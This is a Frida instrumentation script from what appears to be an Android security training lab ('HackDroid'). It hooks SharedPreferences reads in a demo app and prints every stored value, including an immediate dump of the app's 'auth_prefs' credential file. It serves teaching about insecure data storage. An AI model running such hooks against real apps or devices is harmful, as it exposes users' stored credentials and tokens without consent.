// HackDroid — Frida Script: Dump SharedPreferences Strings
// ─────────────────────────────────────────────────────────────────────────────
// Usage:
//   frida -U -f com.hackdroid.demo -l dump_strings.js
//
// What this does:
//   Hooks SharedPreferences.getString() and getAll() to intercept and print
//   every key-value pair read from SharedPreferences at runtime.
//   Also performs an immediate dump of all known preference files.
//
// OWASP M9: Insecure Data Storage
// OWASP M1: Improper Credential Usage
// ─────────────────────────────────────────────────────────────────────────────

Java.perform(function () {
    console.log("[HackDroid] Frida attached — loading SharedPreferences dumper");
    console.log("[HackDroid] Hooking SharedPreferences...");

    var SharedPreferencesImpl = Java.use("android.app.SharedPreferencesImpl");

    // Hook getString() — intercept every read
    SharedPreferencesImpl.getString.implementation = function (key, defValue) {
        var value = this.getString(key, defValue);
        if (value !== null && value !== defValue) {
            console.log("[HackDroid] SharedPreferences.getString(\"" + key + "\") = \"" + value + "\"");
        }
        return value;
    };

    // Hook getAll() — dump entire preference file at once
    SharedPreferencesImpl.getAll.implementation = function () {
        var allEntries = this.getAll();
        console.log("[HackDroid] === SharedPreferences.getAll() DUMP ===");

        // Use keySet() iterator — Map.Entry objects from entrySet() are not
        // properly typed by Frida's Java bridge and getKey()/getValue() fail.
        var keyIterator = allEntries.keySet().iterator();
        while (keyIterator.hasNext()) {
            var key = keyIterator.next().toString();
            var val = allEntries.get(key);
            console.log("[HackDroid]   " + key + " = " + val);
        }
        console.log("[HackDroid] === END DUMP ===");
        return allEntries;
    };

    // Also hook getBoolean, getInt, getLong for completeness
    SharedPreferencesImpl.getBoolean.implementation = function (key, defValue) {
        var value = this.getBoolean(key, defValue);
        console.log("[HackDroid] SharedPreferences.getBoolean(\"" + key + "\") = " + value);
        return value;
    };

    SharedPreferencesImpl.getInt.implementation = function (key, defValue) {
        var value = this.getInt(key, defValue);
        console.log("[HackDroid] SharedPreferences.getInt(\"" + key + "\") = " + value);
        return value;
    };

    // Active dump: find and read auth_prefs immediately
    try {
        var Context     = Java.use("android.content.Context");
        var ActivityThread = Java.use("android.app.ActivityThread");
        var ctx = ActivityThread.currentApplication().getApplicationContext();

        console.log("[HackDroid] === IMMEDIATE AUTH_PREFS DUMP ===");
        var authPrefs = ctx.getSharedPreferences("auth_prefs", 0); // MODE_PRIVATE = 0
        var allAuth   = authPrefs.getAll();
        var authKeyIter = allAuth.keySet().iterator();
        while (authKeyIter.hasNext()) {
            var authKey = authKeyIter.next().toString();
            console.log("[HackDroid]   " + authKey + " => " + allAuth.get(authKey));
        }
        console.log("[HackDroid] === END AUTH_PREFS DUMP ===");
    } catch (e) {
        console.log("[HackDroid] Immediate dump failed: " + e.message);
        console.log("[HackDroid] Passive hooks still active — values will print on access");
    }

    console.log("[HackDroid] ✓ SharedPreferences dump hooks installed");
    console.log("[HackDroid] All getString/getAll calls will be printed here");
});
